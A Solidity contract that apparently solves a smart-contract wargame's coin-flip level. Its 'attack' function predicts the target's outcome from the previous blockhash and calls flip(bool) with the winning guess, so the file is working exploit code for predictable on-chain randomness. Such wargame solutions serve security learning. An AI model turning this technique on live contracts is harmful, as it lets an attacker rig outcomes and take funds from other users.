// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

contract CoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack (address _addr) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bytes memory payloadTrue = abi.encodeWithSignature("flip(bool)", true);
        bytes memory payloadFalse = abi.encodeWithSignature("flip(bool)", false);

        if (side) {
            (bool success, ) = _addr.call(payloadTrue);
            require(success, "Transfer failed");
        } else {
            (bool success, ) = _addr.call(payloadFalse);
            require(success, "Transfer failed");
        }
    }
}